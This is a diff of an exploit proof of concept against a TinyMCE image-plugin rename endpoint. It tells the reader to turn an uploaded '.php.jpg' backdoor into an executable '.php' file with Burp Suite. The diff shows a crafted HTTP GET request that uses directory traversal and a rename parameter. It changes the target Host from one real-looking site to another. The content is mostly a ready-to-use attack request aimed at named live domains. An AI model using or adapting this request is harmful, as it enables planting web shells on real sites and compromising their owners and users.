@@ -13,8 +13,8 @@ Poc :
 [-] Rename Backdoor .php.jpg to .php ( dont forgot to use burpsuite )
 
 ------------------------------------------------------------------------------------------------------------------
-GET /application/assets/admin/js/tinymce/plugins/image/rename_file.php?dummy=1526415811634&path=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fcontent%2Fuploads%2F&new_name=rename ur file and delete jpg.php.jpg&current_name=FILE-20180515-2215L9PSQ9TGNJC7.jpg HTTP/1.1
-Host: www.jac-pharmapxi.fr
+GET /admin/media/tinymce/plugins/image/image.php?dummy=1526415811634&path=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fcontent%2Fuploads%2F&new_name=HERE-FOR-CHANGE-EXTENSION.php.jpg&current_name=FILE-20180515-2215L9PSQ9TGNJC7.jpg HTTP/1.1
+Host: azyb.az
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
 Accept: application/json, text/javascript, */*; q=0.01
 Accept-Language: en-US,en;q=0.5
